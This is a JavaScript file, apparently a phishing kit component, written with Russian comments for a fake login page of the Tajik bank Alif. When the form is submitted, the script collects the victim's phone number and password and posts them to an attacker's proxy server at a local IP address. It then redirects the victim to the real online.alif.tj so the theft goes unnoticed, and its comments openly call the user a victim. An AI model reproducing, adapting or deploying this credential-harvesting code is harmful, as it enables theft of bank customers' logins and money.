// proxy.js

document.addEventListener('DOMContentLoaded', function() {
    // Настройки
    const PROXY_URL = 'http://192.168.16.227:8080'; // Твой локальный IP!
    const LOGIN_FORM = document.querySelector('.login-form');
    const SUBMIT_BTN = document.querySelector('.btn-primary');

    if (!LOGIN_FORM) {
        console.error('Форма входа не найдена!');
        return;
    }

    // Запоминаем оригинальный текст кнопки
    const originalBtnText = SUBMIT_BTN.textContent;

    LOGIN_FORM.addEventListener('submit', function(e) {
        e.preventDefault();

        // 1. Собираем данные
        const phoneInput = document.getElementById('phone');
        const passwordInput = document.getElementById('password');

        if (!phoneInput || !passwordInput) {
            console.error('Поля ввода не найдены!');
            return;
        }

        const formData = {
            phone: phoneInput.value.trim(),
            password: passwordInput.value.trim(),
            userAgent: navigator.userAgent,
            timestamp: new Date().toISOString()
        };

        // 2. Визуальная обратная связь (loading state)
        SUBMIT_BTN.textContent = 'Проверка...';
        SUBMIT_BTN.disabled = true;
        SUBMIT_BTN.style.opacity = '0.7';

        console.log('Отправка данных на прокси:', formData);

        // 3. Отправляем запрос к твоему ноутбуку
        fetch(`${PROXY_URL}/auth`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(formData)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            console.log('Ответ от прокси:', data);

            if (data.status === 'ok') {
                // 4. Успех: перенаправляем жертву в реальный банк
                SUBMIT_BTN.textContent = 'Успешно!';
                SUBMIT_BTN.style.backgroundColor = '#0d8a5f';

                setTimeout(() => {
                    // Подменяем URL, чтобы жертва попала в настоящий online.alif.tj
                    window.location.href = `https://online.alif.tj/?proxy_token=${data.token}&src=verify`;
                }, 1000); // Небольшая задержка для визуального эффекта
            } else {
                throw new Error(data.message || 'Ошибка авторизации');
            }
        })
        .catch(error => {
            console.error('Ошибка при отправке:', error);
            SUBMIT_BTN.textContent = 'Ошибка. Попробуйте снова.';
            SUBMIT_BTN.disabled = false;
            SUBMIT_BTN.style.opacity = '1';

            // Через 3 секунды возвращаем кнопку в исходное состояние, если пользователь не обновил страницу
            setTimeout(() => {
                if (SUBMIT_BTN.textContent.includes('Ошибка')) {
                    SUBMIT_BTN.textContent = originalBtnText;
                }
            }, 3000);
        });
    });
});